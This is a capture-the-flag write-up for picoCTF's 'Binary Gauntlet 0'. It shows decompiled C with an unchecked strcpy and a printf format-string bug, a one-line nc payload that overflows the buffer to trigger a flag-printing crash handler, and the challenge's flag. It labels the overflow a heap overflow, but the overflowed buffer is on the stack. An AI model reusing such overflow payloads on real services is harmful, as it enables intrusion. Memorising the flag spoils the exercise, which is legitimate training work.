# Binary Gauntlet 0

the source code after some reverse engineering and code flow analysis

```c
int main(void)

{
 char local_88 [108];
 __gid_t local_1c;
 FILE *flag_file;
 char *our_input;

 our_input = (char *)malloc(1000);
 flag_file = fopen("flag.txt","r");
 if (flag_file == (FILE *)0x0) {
   puts(
      "Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are runningthis on the shell server."
      );
                /* WARNING: Subroutine does not return */
   exit(0);
 }
 fgets(flag,0x40,flag_file);
 signal(0xb,sigsegv_handler);
 local_1c = getegid();
 setresgid(local_1c,local_1c,local_1c);
 fgets(our_input,1000,stdin);
 our_input[999] = '\0';
 printf(our_input);
 fflush(stdout);
 fgets(our_input,1000,stdin);
 our_input[999] = '\0';
 strcpy(local_88,our_input);
 return 0;
}
```

Notice the `signal()` function. It calls the sigsegv_handler on each `SIGSEGV` error(buffer overflow? heap overflow?)

## sigsegv_handler

so it basically prints the flag

```c
void sigsegv_handler(void)

{
 fprintf(stderr,"%s\n",flag);
 fflush(stderr);
                /* WARNING: Subroutine does not return */
 exit(1);
}
```

we need so somehow trigger a segmetation fault

# Flag

Simply heap overflow it by pushing in a lot of characters

## Payload

```
python3 -c "print('A'*3000)" | nc mercury.picoctf.net 48515
```

```
b8f7e81f00cc0618503136fbacaf5d4c
```
